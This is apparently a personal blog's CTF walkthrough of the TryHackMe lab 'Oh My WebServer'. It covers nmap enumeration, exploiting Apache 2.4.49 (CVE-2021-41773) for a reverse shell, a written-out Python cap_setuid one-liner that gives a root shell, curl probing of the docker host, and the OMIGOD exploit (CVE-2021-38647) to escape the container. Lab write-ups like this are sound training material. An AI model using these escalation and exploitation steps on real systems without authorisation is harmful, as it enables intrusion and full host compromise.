---
title: "Oh My WebServer TryHackMe Machine Writeup and Walkthrough"
author: "Gaurav Raj"
date: 2022-03-13 21:35:30 +530
categories: [CTF, TryHackMe]
tags:
  [
    linux,
    python,
    docker,
    curl,
    setuid,
    ctf,
    tryhackme,
    thm,
    writeup,
    walkthrough,
    linux,
    shell,
    thehackersbrain,
    gauravraj,
    gaurav raj,
    gaurav,
  ]
---

# Introduction

## Target Machine

**Oh My WebServer**

### Target IP

```bash
export IP=10.10.237.191
```

# Enumeration

First of all let's get started by a **Nmap** Scan.

## Nmap

```bash
# Nmap 7.92 scan initiated Sat Mar 12 23:33:44 2022 as: nmap -sC -sV -A -v -oA nmap/initial 10.10.237.191
Nmap scan report for 10.10.237.191
Host is up (0.40s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods:
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-favicon: Unknown favicon MD5: 02FD5D10B62C7BC5AD03F8B0F105323C
|_http-server-header: Apache/2.4.49 (Unix)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 42.513 days (since Sat Jan 29 11:15:21 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   510.90 ms 10.8.0.1
2   511.02 ms 10.10.237.191

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 12 23:34:41 2022 -- 1 IP address (1 host up) scanned in 57.44 seconds
```

## HTTP Port (80)

**HTTP** Server is just running a simple single page application.
![](/assets/images/ohmyweb/Pasted image 20220313131812.png)
After enumerating the **HTTP** Server for a while, running **gobuster**, **nikto**, checking for other services, nothing worked.
After that looking for Services for vulnerability finds out that the **Apache2 2.4.49** is vulnerable to **LFI & RCE** vulnerabilties with **CVE-2021-41773**.

![](/assets/images/ohmyweb/Pasted image 20220313132233.png)
After studing, what was the flaw a written a custom **exploit** for this specific **CVE** which will give us **RCE** on the server, you can find that exploit [here](https://github.com/thehackersbrain/CVE-2021-41773).

# Initial Access

## Reverse Shell

![](/assets/images/ohmyweb/Pasted image 20220313133014.png)

1. Running the exploit and got **RCE** on the machine.
2. Executing Reverse Shell Payload on the machine via **RCE**
3. Listening for new connection via **nc**
4. Got Reverse shell on the box as user **daemon**
5. Looking at the **hostname** of the machine, we can assume it is some kind of container, probably **docker**.

![](/assets/images/ohmyweb/Pasted image 20220313133435.png)
Stablizing the unstable reverse shell to a fully stable **tty bash shell** using **python3**.

![](/assets/images/ohmyweb/Pasted image 20220313133604.png)
As we can see from the above image that **.dockerenv** file is present in the **/** filesystem. it is definitely a **docker** container. So, now we have to somehow break through the container to get a shell to the main filesystem.

### User Flag

While enumerating the machine, found that the machine have **/usr/bin/python3.7** with **cap_setuid+ep** capbility.

```bash
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1(daemon) groups=1(daemon)
```

![](/assets/images/ohmyweb/Pasted image 20220313142216.png)

1. Checking the machine for any **capbilities** that we can use
2. Here we found that **/usr/bin/python3.7** have **cap_setuid+ep** capbilty.
3. Using **/usr/bin/python3.7**'s **cap_setuid+ep** capbility for getting root shell.
4. Here we got shell as **root** but in the **docker** container.
5. And here we got the user flag in **/root/user.txt** file.

Now next thing we have to do is break out of the **docker** container and get shell as the root user in the main filesystem.
So after enumerating the **docker** container for a while, checked the **Network Interfaces** and their assigned **IP Addresses**. Here

```bash
root@4a70924bafa0:/root# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 392  bytes 26852 (26.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 292  bytes 80805 (78.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@4a70924bafa0:/root#
```

Here as we can see that the interface **eth0** have the **IP Address**: **172.17.0.2**, so as we know that this is the **docker** container and then the machine's or the host's IP will be **172.17.0.1**. Let's verify that we are on the correct path by pinging the host.

![](/assets/images/ohmyweb/Pasted image 20220313144458.png)

1. Checking the Network Interfaces
2. On the **eth0** we have a **IP** assigned to that.
3. So the **IP** of the container is **172.17.0.2** which means the **IP** of the host machine will be **172.17.0.1**.
4. Let's check our assumption by pinging the host.
5. As we can see **ping** command is not available, so using **curl** to check if our assumption is correct.
6. And voila, we were right.

Now let's scan for open ports on the host machine, for that also, we can use **curl** as well.

```bash
root@4a70924bafa0:/root# curl http://172.17.0.1:22
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
Invalid SSH identification string.
curl: (56) Recv failure: Connection reset by peer
root@4a70924bafa0:/root# curl http://172.17.0.1:80 >/dev/null
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 57985  100 57985    0     0  18.4M      0 --:--:-- --:--:-- --:--:-- 18.4M
root@4a70924bafa0:/root# curl http://172.17.0.1:5985
curl: (7) Failed to connect to 172.17.0.1 port 5985: Connection refused
root@4a70924bafa0:/root# curl http://172.17.0.1:5986
curl: (56) Recv failure: Connection reset by peer
root@4a70924bafa0:/root#
```

![](/assets/images/ohmyweb/Pasted image 20220313161152.png)
So here we do have 4 ports open.

| S.No | Port | Service |
| :--: | :--: | :-----: |
|  1   |  22  |   SSH   |
|  2   |  80  |  HTTP   |
|  3   | 5985 |  WinRM  |
|  4   | 5986 | Wsmans  |

After enumerating the host machine's services for a while, found that **WinRM** service, commonly on ports **5985**, **5986** is vulnerable with the **CVE-2021-38647**, exploit can be found [here](https://github.com/AlteredSecurity/CVE-2021-38647).
This exploit is against the `OHMIGOD` service, commonly runnnig on ports as `5986`

Let's exploit that and get a reverse shell as root.
![](/assets/images/ohmyweb/Pasted image 20220313163922.png)

1. So ran that exploit with the specified arguments and got the root flag

So here we completed our machine, hope you all enjoyed it. Don't forget to share if you liked.

